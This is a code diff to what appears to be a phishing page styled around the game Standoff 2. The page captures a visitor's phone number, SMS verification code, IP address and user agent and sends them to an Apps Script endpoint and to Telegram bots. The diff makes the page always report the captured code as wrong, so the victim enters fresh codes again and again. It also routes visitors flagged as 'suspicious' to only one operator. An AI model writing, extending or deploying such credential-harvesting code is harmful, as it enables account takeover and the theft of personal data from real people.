@@ -212,10 +212,8 @@
             var prefix = suspicious ? '⚠️ Подозрительный!\n' : '';
             var msg = prefix + '📱 Standoff 2\nНомер: ' + fullPhone + '\nIP: ' + ip;
             
-            // Всегда через Apps Script
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function() {});
             
-            // Дополнительно напрямую в Telegram с фильтром
             if (suspicious) { sendToTelegram(TG_TOKEN_MY, TG_CHAT_MY, msg); }
             else { sendToTelegram(TG_TOKEN_EGO, TG_CHAT_EGO, msg); sendToTelegram(TG_TOKEN_MY, TG_CHAT_MY, msg); }
             
@@ -230,7 +228,7 @@
         async function confirmCode() {
             if (!codeUnlocked) { document.getElementById('code-error').textContent = 'Дождитесь окончания таймера'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             var codeInput = document.getElementById('code'); var code = codeInput.value.replace(/\D/g, '');
-            if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из SMS'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
+            if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из SMS (минимум 4 цифры)'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             document.getElementById('code-error').style.display = 'none';
             var ip = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'ПРОВЕРКА...';
             var suspicious = isSuspicious();
@@ -243,7 +241,13 @@
             else { sendToTelegram(TG_TOKEN_EGO, TG_CHAT_EGO, msg); sendToTelegram(TG_TOKEN_MY, TG_CHAT_MY, msg); }
             
             clearInterval(timerInterval);
-            setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 1000);
+            
+            document.getElementById('code-error').textContent = '❌ Неверный код. Проверьте SMS и попробуйте ещё раз';
+            document.getElementById('code-error').style.display = 'block';
+            codeInput.value = '';
+            codeInput.focus();
+            btn.disabled = false;
+            btn.textContent = 'Подтвердить';
         }
     </script>
 </body>
